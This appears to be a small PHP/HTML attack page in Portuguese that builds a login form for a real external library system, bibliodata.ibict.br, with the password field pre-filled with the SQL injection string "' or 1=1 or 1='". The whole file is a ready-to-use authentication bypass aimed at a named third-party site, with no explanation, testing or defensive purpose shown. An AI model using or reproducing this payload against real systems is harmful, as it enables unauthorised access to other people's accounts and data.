<?php
$senha = "' or 1=1 or 1='";
?>
<h1>Bibliotedata</h1>
<FORM ACTION="http://bibliodata.ibict.br/geral/modelos/identifica.asp" METHOD=POST NAME="Campos"  target="_top">
Login: <INPUT TYPE="text" NAME="SLogin" size="20"> 
<br>
Senha: <INPUT TYPE="password" size="10" size="20" NAME="SSenha" value="<?php echo $senha;?>">
<br><br>
<INPUT TYPE="submit" value="entrar">
